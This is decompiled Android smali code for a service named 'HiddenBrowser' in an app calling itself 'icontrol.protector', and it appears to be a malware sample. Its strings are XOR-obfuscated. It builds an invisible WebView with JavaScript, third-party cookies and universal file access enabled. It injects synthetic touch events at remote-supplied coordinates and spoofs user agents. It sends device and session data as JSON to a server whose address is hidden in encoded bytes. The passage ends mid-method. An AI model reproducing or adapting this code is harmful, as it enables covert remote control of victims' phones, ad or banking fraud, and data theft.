.class public Lcom/icontrol/protector/HiddenBrowser;
.super Landroid/app/Service;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/HiddenBrowser$i;,
        Lcom/icontrol/protector/HiddenBrowser$j;
    }
.end annotation


# static fields
.field private static g:Lcom/icontrol/protector/HiddenBrowser;

.field private static volatile h:J


# instance fields
.field private b:Landroid/webkit/WebView;

.field private c:Z

.field private d:Lntidisestablish/neumonoul/floccinaucinih/m70;

.field private e:Lntidisestablish/neumonoul/floccinaucinih/ks;

.field public f:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/HiddenBrowser;->c:Z

    const-string v0, ""

    iput-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->f:Ljava/lang/String;

    return-void
.end method

.method private b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 3

    .line 1
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-nez v0, :cond_0

    new-instance v0, Lntidisestablish/neumonoul/floccinaucinih/kx$a;

    invoke-direct {v0}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;-><init>()V

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/ab;->c()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;->f(Ljava/lang/String;)Lntidisestablish/neumonoul/floccinaucinih/kx$a;

    move-result-object v0

    invoke-virtual {v0}, Lntidisestablish/neumonoul/floccinaucinih/kx$a;->a()Lntidisestablish/neumonoul/floccinaucinih/kx;

    move-result-object v0

    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    new-instance v2, Lcom/icontrol/protector/HiddenBrowser$h;

    invoke-direct {v2, p0, p1, p2}, Lcom/icontrol/protector/HiddenBrowser$h;-><init>(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v1, v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/ks;->z(Lntidisestablish/neumonoul/floccinaucinih/kx;Lntidisestablish/neumonoul/floccinaucinih/o70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    goto :goto_0

    :cond_0
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->r(Landroid/content/Context;Ljava/lang/String;)V

    :goto_0
    return-void
.end method

.method static synthetic d(Lcom/icontrol/protector/HiddenBrowser;)Landroid/webkit/WebView;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    return-object p0
.end method

.method static synthetic e(Lcom/icontrol/protector/HiddenBrowser;FF)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->s(FF)V

    return-void
.end method

.method static synthetic f(J)J
    .locals 0

    .line 1
    sput-wide p0, Lcom/icontrol/protector/HiddenBrowser;->h:J

    return-wide p0
.end method

.method static synthetic g(Lcom/icontrol/protector/HiddenBrowser;)Z
    .locals 0

    .line 1
    iget-boolean p0, p0, Lcom/icontrol/protector/HiddenBrowser;->c:Z

    return p0
.end method

.method static synthetic h(Lcom/icontrol/protector/HiddenBrowser;Z)Z
    .locals 0

    .line 1
    iput-boolean p1, p0, Lcom/icontrol/protector/HiddenBrowser;->c:Z

    return p1
.end method

.method static synthetic i(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->b(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic j(Lcom/icontrol/protector/HiddenBrowser;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/HiddenBrowser;->r(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic k(Lcom/icontrol/protector/HiddenBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-object p1
.end method

.method static synthetic l(Lcom/icontrol/protector/HiddenBrowser;)Lntidisestablish/neumonoul/floccinaucinih/ks;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/HiddenBrowser;->e:Lntidisestablish/neumonoul/floccinaucinih/ks;

    return-object p0
.end method

.method public static p()Lcom/icontrol/protector/HiddenBrowser;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/HiddenBrowser;->g:Lcom/icontrol/protector/HiddenBrowser;

    return-object v0
.end method

.method private static q()Z
    .locals 6

    .line 1
    sget-wide v0, Lcom/icontrol/protector/HiddenBrowser;->h:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    :cond_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    sget-wide v4, Lcom/icontrol/protector/HiddenBrowser;->h:J

    sub-long/2addr v2, v4

    const-wide/16 v4, 0x7530

    cmp-long v0, v2, v4

    if-gez v0, :cond_1

    const/4 v1, 0x1

    :cond_1
    return v1
.end method

.method private r(Landroid/content/Context;Ljava/lang/String;)V
    .locals 10

    .line 1
    const/4 v0, 0x2

    const/16 v1, 0x3e8

    const/16 v2, 0x8

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v3, v2, [B

    fill-array-data v3, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {p1, v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lntidisestablish/neumonoul/floccinaucinih/ab;->w:Ljava/lang/String;

    const/4 v4, 0x0

    invoke-static {p1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0xa

    if-eqz v0, :cond_1

    if-nez v3, :cond_0

    goto/16 :goto_0

    :cond_0
    sget-object v5, Lntidisestablish/neumonoul/floccinaucinih/ab;->y:Ljava/lang/String;

    const/4 v6, 0x4

    new-array v7, v6, [B

    fill-array-data v7, :array_4

    new-array v8, v2, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {p1, v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    const/4 v7, 0x3

    new-array v8, v7, [B

    fill-array-data v8, :array_6

    new-array v9, v2, [B

    fill-array-data v9, :array_7

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v5, v8, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v3, v7, [B

    fill-array-data v3, :array_8

    new-array v8, v2, [B

    fill-array-data v8, :array_9

    invoke-static {v3, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v3, v2, [B

    fill-array-data v3, :array_b

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v3, v4, [B

    fill-array-data v3, :array_c

    new-array v4, v2, [B

    fill-array-data v4, :array_d

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v6, [B

    fill-array-data v0, :array_e

    new-array v3, v2, [B

    fill-array-data v3, :array_f

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v3, v7, [B

    fill-array-data v3, :array_10

    new-array v4, v2, [B

    fill-array-data v4, :array_11

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v5, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v0, v7, [B

    fill-array-data v0, :array_12

    new-array v3, v2, [B

    fill-array-data v3, :array_13

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p2, v7, [B

    fill-array-data p2, :array_14

    new-array v0, v2, [B

    fill-array-data v0, :array_15

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v5, p2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z

    goto :goto_2

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_1
    :goto_0
    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    new-array p2, v4, [B

    fill-array-data p2, :array_16

    new-array v0, v2, [B

    fill-array-data v0, :array_17

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :goto_1
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    iget-object p1, p0, Lcom/icontrol/protector/HiddenBrowser;->d:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz p1, :cond_2

    const/16 p2, 0x1c

    new-array p2, p2, [B

    fill-array-data p2, :array_18

    new-array v0, v2, [B

    fill-array-data v0, :array_19

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v1, p2}, Lntidisestablish/neumonoul/floccinaucinih/m70;->b(ILjava/lang/String;)Z

    :cond_2
    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x53t
        0x66t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x1ct
        0x22t
        0x20t
        -0x4at
        0x7ft
        0x6t
        -0x6bt
        0x47t
    .end array-data

    :array_2
    .array-data 1
        -0x46t
        0x28t
        -0x4at
        0x2dt
        -0x7ft
        0x40t
        0x26t
        -0x19t
    .end array-data

    :array_3
    .array-data 1
        -0x2t
        0x4dt
        -0x40t
        0x44t
        -0x1et
        0x25t
        0x4ft
        -0x7dt
    .end array-data

    :array_4
    .array-data 1
        0x1et
        0x7at
        0x64t
        0x6ft
    .end array-data

    :array_5
    .array-data 1
        0x70t
        0xft
        0x8t
        0x3t
        -0x2at
        0x51t
        -0x35t
        -0x1ft
    .end array-data

    :array_6
    .array-data 1
        -0x57t
        0x53t
        0x72t
    .end array-data

    :array_7
    .array-data 1
        -0x40t
        0x37t
        0x14t
        0x2et
        -0x37t
        0x42t
        0x3at
        0x18t
    .end array-data

    :array_8
    .array-data 1
        -0x31t
        -0x4at
        0x6t
    .end array-data

    :array_9
    .array-data 1
        -0x41t
        -0x21t
        0x62t
        0x7et
        0x1at
        -0x1at
        -0x39t
        0x6at
    .end array-data

    :array_a
    .array-data 1
        -0x77t
        -0x12t
        -0x8t
        -0x12t
        -0x19t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x20t
        -0x66t
        -0x7ft
        -0x62t
        -0x7et
        0x35t
        0x4dt
        -0xdt
    .end array-data

    :array_c
    .array-data 1
        0x4at
        0x40t
        -0x41t
        0x7ct
        -0xet
        -0x4ft
        -0x4t
        0x4ct
        0x77t
        0x58t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x19t
        0x2ct
        -0x33t
        0x23t
        -0x6ft
        -0x23t
        -0x6bt
        0x29t
    .end array-data

    :array_e
    .array-data 1
        -0x77t
        -0x80t
        -0x6dt
        0xat
    .end array-data

    :array_f
    .array-data 1
        -0x6t
        -0xbt
        -0xft
        0x69t
        0x1t
        0x79t
        0x5et
        -0x5ct
    .end array-data

    :array_10
    .array-data 1
        0x6ft
        -0x65t
        0x46t
    .end array-data

    :array_11
    .array-data 1
        0x2t
        -0x18t
        0x21t
        -0x5at
        0x0t
        -0x8t
        -0x77t
        0x3t
    .end array-data

    :array_12
    .array-data 1
        0x78t
        -0x29t
        0x30t
    .end array-data

    :array_13
    .array-data 1
        0x15t
        -0x5ct
        0x57t
        -0x57t
        0x40t
        -0x25t
        0xbt
        -0x20t
    .end array-data

    :array_14
    .array-data 1
        -0x78t
        0x38t
        -0x4dt
    .end array-data

    :array_15
    .array-data 1
        -0x15t
        0x51t
        -0x3dt
        0x6dt
        -0x74t
        0x3bt
        0x1at
        0x66t
    .end array-data

    :array_16
    .array-data 1
        -0x7bt
        -0x42t
        0x61t
        0x31t
        0x68t
        0x4t
        0x27t
        -0x67t
        -0x7ft
        -0x6dt
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x38t
        -0x29t
        0x12t
        0x42t
        0x1t
        0x6at
        0x40t
        -0x47t
    .end array-data

    :array_18
    .array-data 1
        0x1et
        0x20t
        0x74t
        0x3dt
        -0x3bt
        0x4t
        -0x4at
        -0x3at
        0x29t
        0x3bt
        0x68t
        0x35t
        -0x69t
        0x49t
        -0x49t
        -0x40t
        0x28t
        0x33t
        0x61t
        0x37t
        -0x69t
        0x57t
        -0x49t
        -0x23t
        0x3ft
        0x3bt
        0x68t
        0x35t
    .end array-data

    :array_19
    .array-data 1
        0x5bt
        0x52t
        0x6t
        0x52t
        -0x49t
        0x24t
        -0x2et
        -0x4dt
    .end array-data
.end method

.method private s(FF)V
    .locals 25

    .line 1
    move-object/from16 v0, p0

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v17

    invoke-static {}, Landroid/os/SystemClock;->uptimeMillis()J

    move-result-wide v19

    const/4 v1, 0x1

    new-array v15, v1, [Landroid/view/MotionEvent$PointerProperties;

    new-instance v2, Landroid/view/MotionEvent$PointerProperties;

    invoke-direct {v2}, Landroid/view/MotionEvent$PointerProperties;-><init>()V

    const/4 v3, 0x0

    iput v3, v2, Landroid/view/MotionEvent$PointerProperties;->id:I

    iput v1, v2, Landroid/view/MotionEvent$PointerProperties;->toolType:I

    aput-object v2, v15, v3

    new-array v14, v1, [Landroid/view/MotionEvent$PointerCoords;

    new-instance v1, Landroid/view/MotionEvent$PointerCoords;

    invoke-direct {v1}, Landroid/view/MotionEvent$PointerCoords;-><init>()V

    move/from16 v2, p1

    iput v2, v1, Landroid/view/MotionEvent$PointerCoords;->x:F

    move/from16 v2, p2

    iput v2, v1, Landroid/view/MotionEvent$PointerCoords;->y:F

    const/high16 v2, 0x3f800000    # 1.0f

    iput v2, v1, Landroid/view/MotionEvent$PointerCoords;->pressure:F

    iput v2, v1, Landroid/view/MotionEvent$PointerCoords;->size:F

    aput-object v1, v14, v3

    const/4 v5, 0x0

    const/4 v6, 0x1

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/high16 v11, 0x3f800000    # 1.0f

    const/high16 v12, 0x3f800000    # 1.0f

    const/4 v13, 0x0

    const/16 v16, 0x0

    const/16 v21, 0x0

    const/16 v22, 0x0

    move-wide/from16 v1, v17

    move-wide/from16 v3, v19

    move-object v7, v15

    move-object v8, v14

    move-object/from16 v23, v14

    move/from16 v14, v16

    move-object/from16 v24, v15

    move/from16 v15, v21

    move/from16 v16, v22

    invoke-static/range {v1 .. v16}, Landroid/view/MotionEvent;->obtain(JJII[Landroid/view/MotionEvent$PointerProperties;[Landroid/view/MotionEvent$PointerCoords;IIFFIIII)Landroid/view/MotionEvent;

    move-result-object v1

    iget-object v2, v0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v2, v1}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    const/4 v5, 0x1

    const/4 v14, 0x0

    const/4 v15, 0x0

    const/16 v16, 0x0

    move-wide/from16 v1, v17

    move-object/from16 v7, v24

    move-object/from16 v8, v23

    invoke-static/range {v1 .. v16}, Landroid/view/MotionEvent;->obtain(JJII[Landroid/view/MotionEvent$PointerProperties;[Landroid/view/MotionEvent$PointerCoords;IIFFIIII)Landroid/view/MotionEvent;

    move-result-object v1

    iget-object v2, v0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v2, v1}, Landroid/view/View;->dispatchTouchEvent(Landroid/view/MotionEvent;)Z

    return-void
.end method

.method private u(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6

    .line 1
    new-instance v0, Landroid/webkit/WebView;

    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    :try_start_0
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/CookieManager;->setAcceptCookie(Z)V

    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object v0

    iget-object v2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0, v2, v1}, Landroid/webkit/CookieManager;->setAcceptThirdPartyCookies(Landroid/webkit/WebView;Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/4 v2, 0x0

    invoke-virtual {v0, v2}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    iget-object v0, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    const/4 v0, 0x0

    :try_start_1
    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/4 v4, 0x2

    invoke-virtual {v3, v4, v0}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    sget-object v4, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    sget-object v4, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    const/4 v4, -0x1

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    iget-object v3, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    new-array v1, v1, [B

    const/16 v3, 0xb

    aput-byte v3, v1, v2

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const/16 p2, 0xa

    new-array p2, p2, [B

    fill-array-data p2, :array_1

    new-array v1, v4, [B

    fill-array-data v1, :array_2

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_1

    new-array p2, v3, [B

    fill-array-data p2, :array_3

    new-array v1, v4, [B

    fill-array-data v1, :array_4

    invoke-static {p2, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-eqz p2, :cond_0

    goto :goto_1

    :cond_0
    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {p2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p2

    const/16 v1, 0xc4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    new-array v3, v4, [B

    fill-array-data v3, :array_6

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    :goto_0
    invoke-virtual {p2, v1}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    goto :goto_3

    :cond_1
    :goto_1
    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {p2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p2

    const/16 v1, 0x84

    new-array v1, v1, [B

    fill-array-data v1, :array_7

    new-array v3, v4, [B

    fill-array-data v3, :array_8

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_2
    const/4 v1, 0x3

    new-array v3, v1, [B

    fill-array-data v3, :array_9

    new-array v5, v4, [B

    fill-array-data v5, :array_a

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_3

    new-array v1, v1, [B

    fill-array-data v1, :array_b

    new-array v3, v4, [B

    fill-array-data v3, :array_c

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const-string v3, ""

    invoke-virtual {p2, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p2

    :goto_2
    iget-object v1, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, p2}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

    goto :goto_3

    :cond_3
    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    invoke-virtual {p2}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p2

    invoke-virtual {p2}, Landroid/webkit/WebSettings;->getUserAgentString()Ljava/lang/String;

    move-result-object p2

    goto :goto_2

    :goto_3
    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    new-instance v1, Lcom/icontrol/protector/HiddenBrowser$i;

    invoke-direct {v1, p0}, Lcom/icontrol/protector/HiddenBrowser$i;-><init>(Lcom/icontrol/protector/HiddenBrowser;)V

    invoke-virtual {p2, v1}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object p2, p0, Lcom/icontrol/protector/HiddenBrowser;->b:Landroid/webkit/WebView;

    new-instance v1, Lcom/icontrol/protector/HiddenBrowser$j;

    invoke-direct {v1, p0, v0}, Lcom/icontrol/protector/HiddenBrowser$j;-><init>(Lcom/icontrol/protector/HiddenBrowser;Lcom/icontrol/protector/HiddenBrowser$a;)V

    invoke-virtual {p2, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

